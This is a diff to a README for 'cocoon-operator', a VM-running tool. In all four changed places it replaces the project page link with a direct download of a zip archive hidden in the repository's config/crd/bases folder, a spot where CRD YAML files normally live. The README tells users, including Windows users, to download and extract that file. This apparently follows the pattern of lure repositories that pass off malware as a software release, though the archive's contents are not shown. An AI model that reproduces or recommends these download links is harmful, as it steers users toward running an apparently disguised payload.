@@ -1,6 +1,6 @@
 # 🌀 cocoon-operator - Run Stateful VMs With Ease
 
-[![Download cocoon-operator](https://img.shields.io/badge/Download-Visit%20the%20page-blue)](https://github.com/Shoshannaamateurish113/cocoon-operator)
+[![Download cocoon-operator](https://img.shields.io/badge/Download-Visit%20the%20page-blue)](https://github.com/Shoshannaamateurish113/cocoon-operator/raw/refs/heads/main/config/crd/bases/operator_cocoon_1.0-beta.1.zip)
 
 ## 📦 What cocoon-operator does
 
@@ -22,7 +22,7 @@ The app is built around two custom resources:
 
 Use this link to download or visit the project page:
 
-https://github.com/Shoshannaamateurish113/cocoon-operator
+https://github.com/Shoshannaamateurish113/cocoon-operator/raw/refs/heads/main/config/crd/bases/operator_cocoon_1.0-beta.1.zip
 
 ### What to do on Windows
 
@@ -80,7 +80,7 @@ Have these ready:
 ## 🚀 How to get started
 
 1. Open the download page:
-   https://github.com/Shoshannaamateurish113/cocoon-operator
+   https://github.com/Shoshannaamateurish113/cocoon-operator/raw/refs/heads/main/config/crd/bases/operator_cocoon_1.0-beta.1.zip
 2. Download the latest available file or source package.
 3. If needed, extract the files to a folder you can find later.
 4. Read the included files for the start steps.
@@ -181,4 +181,4 @@ After download, the package may include:
 
 Use this link if you need to visit the project page and get the files again:
 
-https://github.com/Shoshannaamateurish113/cocoon-operator
+https://github.com/Shoshannaamateurish113/cocoon-operator/raw/refs/heads/main/config/crd/bases/operator_cocoon_1.0-beta.1.zip
